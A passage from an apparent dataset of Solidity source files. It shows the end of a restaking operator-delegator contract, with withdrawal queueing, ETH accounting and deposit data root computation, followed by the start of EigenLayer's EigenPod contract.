Memory.copyBytes(signatureBatch, signature, i * BLS_SIGNATURE_LENGTH, 0, BLS_SIGNATURE_LENGTH);\n            depositDataRoot = _computeDepositDataRoot(withdrawalCredentials_, publicKey, signature);\n\n            eigenPodManager.stake{value: ETH_DEPOSIT_SIZE}(publicKey, signature, depositDataRoot);\n        }\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Queues a withdrawal of the specified amount of `shares` from the given `strategy` to the withdrawal queue,\n    /// intended for settling user withdrawals.\n    /// @param strategy The strategy from which to withdraw.\n    /// @param shares The amount of shares to withdraw.\n    function queueWithdrawalForUserSettlement(address strategy, uint256 shares) external onlyCoordinator returns (bytes32 root) {\n        if (strategy == BEACON_CHAIN_STRATEGY) {\n            _increaseETHQueuedForUserSettlement(shares);\n        }\n        root = _queueWithdrawal(strategy, shares, address(withdrawalQueue()));\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Queues a withdrawal of the specified amount of `shares` from the given `strategy` to the deposit pool,\n    /// specifically for facilitating operator exits.\n    /// @param strategy The strategy from which to withdraw.\n    /// @param shares The amount of shares to withdraw.\n    function queueWithdrawalForOperatorExit(address strategy, uint256 shares) external onlyOperatorRegistry returns (bytes32 root) {\n        root = _queueWithdrawalForOperatorExitOrScrape(strategy, shares);\n    }\n\n    /// @notice Decrease the amount of ETH queued from EigenLayer for user settlement.\n    /// @param amountWei The amount of ETH to decrease by, in wei.\n    function decreaseETHQueuedForUserSettlement(uint256 amountWei) external onlyWithdrawalQueue {\n        _decreaseETHQueuedForUserSettlement(amountWei);\n    }\n\n    /// @dev Decrease the amount of ETH queued for operator exit or excess full withdrawal scrape\n    /// from EigenLayer.\n    /// @param amountWei The amount of ETH to decrease by, in wei.\n    function decreaseETHQueuedForOperatorExitOrScrape(uint256 amountWei) external onlyDepositPool {\n        _decreaseETHQueuedForOperatorExitOrScrape(amountWei);\n    }\n\n    /// @notice Forwards ETH rewards to the reward distributor. This includes partial\n    /// withdrawals and any amount in excess of 32 ETH for full withdrawals.\n    receive() external payable {\n        address(rewardDistributor()).transferETH(msg.value);\n    }\n\n    // forgefmt: disable-next-item\n    /// @dev Queues a withdrawal of the specified amount of `shares` from the given `strategy` to the deposit pool,\n    /// specifically for facilitating operator exits or excess full withdrawal scrapes.\n    /// @param strategy The strategy from which to withdraw.\n    /// @param shares The amount of shares to withdraw.\n    function _queueWithdrawalForOperatorExitOrScrape(address strategy, uint256 shares) internal returns (bytes32 root) {\n        if (strategy == BEACON_CHAIN_STRATEGY) {\n            _increaseETHQueuedForOperatorExitOrScrape(shares);\n        }\n        root = _queueWithdrawal(strategy, shares, address(depositPool()));\n    }\n\n    // forgefmt: disable-next-item\n    /// @dev Queue a withdrawal of the given amount of `shares` to the `withdrawer` from the provided `strategy`.\n    /// @param strategy The strategy to withdraw from.\n    /// @param shares The amount of shares to withdraw.\n    /// @param withdrawer The address who has permission to complete the withdrawal.\n    function _queueWithdrawal(address strategy, uint256 shares, address withdrawer) internal returns (bytes32 root) {\n        IDelegationManager.QueuedWithdrawalParams[] memory withdrawalParams = new IDelegationManager.QueuedWithdrawalParams[](1);\n        withdrawalParams[0] = IDelegationManager.QueuedWithdrawalParams({\n            strategies: strategy.toArray(),\n            shares: shares.toArray(),\n            withdrawer: withdrawer\n        });\n        root = delegationManager.queueWithdrawals(withdrawalParams)[0];\n    }\n\n    /// @dev Increase the amount of ETH queued from EigenLayer for user settlement.\n    /// @param amountWei The amount of ETH to increase by, in wei.\n    function _increaseETHQueuedForUserSettlement(uint256 amountWei) internal {\n        ethQueuedForUserSettlementGwei += amountWei.toGwei();\n    }\n\n    /// @dev Decrease the amount of ETH queued from EigenLayer for user settlement.\n    /// @param amountWei The amount of ETH to decrease by, in wei.\n    function _decreaseETHQueuedForUserSettlement(uint256 amountWei) internal {\n        ethQueuedForUserSettlementGwei -= amountWei.toGwei();\n    }\n\n    /// @dev Increase the amount of ETH queued for operator exit or excess full withdrawal scrape\n    /// from EigenLayer.\n    /// @param amountWei The amount of ETH to increase by, in wei.\n    function _increaseETHQueuedForOperatorExitOrScrape(uint256 amountWei) internal {\n        ethQueuedForOperatorExitsAndScrapesGwei += amountWei.toGwei();\n    }\n\n    /// @dev Decrease the amount of ETH queued for operator exit or excess full withdrawal scrape\n    /// from EigenLayer.\n    /// @param amountWei The amount of ETH to decrease by, in wei.\n    function _decreaseETHQueuedForOperatorExitOrScrape(uint256 amountWei) internal {\n        ethQueuedForOperatorExitsAndScrapesGwei -= amountWei.toGwei();\n    }\n\n    /// @dev Compute withdrawal credentials for the given EigenPod.\n    /// @param pod The EigenPod to compute the withdrawal credentials for.\n    function _computeWithdrawalCredentials(address pod) internal pure returns (bytes32) {\n        return WITHDRAWALS_ENABLED_PREFIX | bytes32(uint256(uint160(pod)));\n    }\n\n    // forgefmt: disable-next-item\n    /// @dev Computes the deposit_root_hash required by the Beacon Deposit contract.\n    /// @param withdrawalCredentials_ Credentials to withdraw ETH on Consensus Layer.\n    /// @param publicKey A BLS12-381 public key.\n    /// @param signature A BLS12-381 signature.\n    function _computeDepositDataRoot(bytes32 withdrawalCredentials_, bytes memory publicKey, bytes memory signature) internal pure returns (bytes32) {\n        // Compute the deposit data root (`DepositData` hash tree root) according to deposit_contract.sol\n        bytes memory sigPart1 = Memory.unsafeAllocateBytes(64);\n        bytes memory sigPart2 = Memory.unsafeAllocateBytes(32);\n\n        Memory.copyBytes(signature, sigPart1, 0, 0, 64);\n        Memory.copyBytes(signature, sigPart2, 64, 0, 32);\n\n        bytes32 publicKeyRoot = sha256(abi.encodePacked(publicKey, bytes16(0)));\n        bytes32 signatureRoot =\n            sha256(abi.encodePacked(sha256(abi.encodePacked(sigPart1)), sha256(abi.encodePacked(sigPart2, bytes32(0)))));\n\n        return sha256(\n            abi.encodePacked(\n                sha256(abi.encodePacked(publicKeyRoot, withdrawalCredentials_)),\n                sha256(abi.encodePacked(ETH_DEPOSIT_SIZE_IN_GWEI_LE64, bytes24(0), signatureRoot))\n            )\n        );\n    }\n}"
    },
    {
      "filename": "src/contracts/pods/EigenPod.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity =0.8.12;\n\nimport \"@openzeppelin-upgrades/contracts/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin-upgrades/contracts/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin-upgrades/contracts/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin-upgrades/contracts/utils/AddressUpgradeable.sol\";\nimport \"@openzeppelin-upgrades/contracts/utils/math/MathUpgradeable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\nimport \"../libraries/BeaconChainProofs.sol\";\nimport \"../libraries/BytesLib.sol\";\nimport \"../libraries/Endian.sol\";\n\nimport \"../interfaces/IETHPOSDeposit.sol\";\nimport \"../interfaces/IEigenPodManager.sol\";\nimport \"../interfaces/IEigenPod.sol\";\nimport \"../interfaces/IDelayedWithdrawalRouter.sol\";\nimport \"../interfaces/IPausable.sol\";\n\nimport \"./EigenPodPausingConstants.sol\";\n\n/**\n * @title The implementation contract used for restaking beacon chain ETH on EigenLayer\n * @author Layr Labs, Inc.\n * @notice Terms of Service: https://docs.eigenlayer.xyz/overview/terms-of-service\n * @notice The main functionalities are:\n * - creating new ETH validators with their withdrawal credentials pointed to this contract\n * - proving from beacon chain state roots that withdrawal credentials are pointed to this contract\n * - proving from beacon chain state roots the balances of ETH validators with their withdrawal credentials\n *   pointed to this contract\n * - updating aggregate balances in the EigenPodManager\n * - withdrawing eth when withdrawals are initiated\n * @notice This EigenPod Beacon Proxy implementation adheres to the current Capella consensus specs\n * @dev Note that all beacon chain balances are stored as gwei within the beacon chain datastructures. We choose\n *   to account balances in terms of gwei in the EigenPod contract and convert to wei when making calls to other contracts\n */\ncontract EigenPod is IEigenPod, Initializable, ReentrancyGuardUpgradeable, EigenPodPausingConstants {\n    using BytesLib for bytes;\n    using SafeERC20 for IERC20;\n    using BeaconChainProofs for *;\n\n    // CONSTANTS + IMMUTABLES\n    // @notice Internal constant used in calculations, since the beacon chain stores balances in Gwei rather than wei\n    uint256 internal constant GWEI_TO_WEI = 1e9;\n\n    /**\n     * @notice Maximum \"staleness\" of a Beacon Chain state root against which `verifyBalanceUpdate` or `verifyWithdrawalCredentials` may be proven.\n     * We can't allow \"stale\" roots to be used for restaking as the validator may have been slashed in a more updated beacon state root. \n     */\n    uint256 internal constant VERIFY_BALANCE_UPDATE_WINDOW_SECONDS = 4.5 hours;\n\n    /// @notice This is the beacon chain deposit contract\n    IETHPOSDeposit public immutable ethPOS;\n\n    /// @notice Contract used for withdrawal routing, to provide an extra \"safety net\" mechanism\n    IDelayedWithdrawalRouter public immutable delayedWithdrawalRouter;\n\n    /// @notice The single EigenPodManager for EigenLayer\n    IEigenPodManager public immutable eigenPodManager;\n\n    ///@notice The maximum amount of ETH, in gwei, a validator can have restaked in the eigenlayer\n    uint64 public immutable MAX_RESTAKED_BALANCE_GWEI_PER_VALIDATOR;\n\n    /// @notice This is the genesis time of the b"
    }
  ]
}